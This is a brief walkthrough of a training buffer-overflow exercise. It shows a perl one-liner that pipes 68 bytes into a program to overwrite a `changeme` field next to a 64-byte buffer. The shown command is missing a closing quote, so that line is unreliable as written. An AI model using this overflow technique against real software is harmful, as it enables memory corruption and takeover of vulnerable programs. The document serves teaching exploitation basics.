# Walkthrough

This is a straightforward buffer overflow. The array `buffer` in the `locals`
struct can be overflowed by writing more than 64 characters. So let's run

```
$ perl -e 'print "A"x68 | ./program
```

which makes `locals` change to

```
----------------------------
buffer   | AA...A (64 bytes)
changeme | AAAA   (4 bytes)
----------------------------
```
